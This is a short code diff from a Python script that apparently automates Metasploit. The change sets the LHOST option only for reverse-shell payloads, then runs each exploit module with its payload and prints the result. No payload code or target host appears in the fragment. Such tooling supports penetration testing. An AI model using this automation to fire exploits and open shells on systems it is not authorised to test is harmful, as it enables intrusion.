@@ -511,7 +511,8 @@ def main():
               print (f"{search_results[index]['fullname']} payload {payload[index1]}", end='')
               try:
                   payload_obj = client.modules.use('payload', payload[index1])
-                  payload_obj['LHOST'] = LHOST
+                  if 'reverse' in payload[index1]:
+                      payload_obj['LHOST'] = LHOST
                   payload_obj['LPORT'] = LPORT
                   console.run_module_with_output(exploit, payload_obj)
                   print (": Ok")
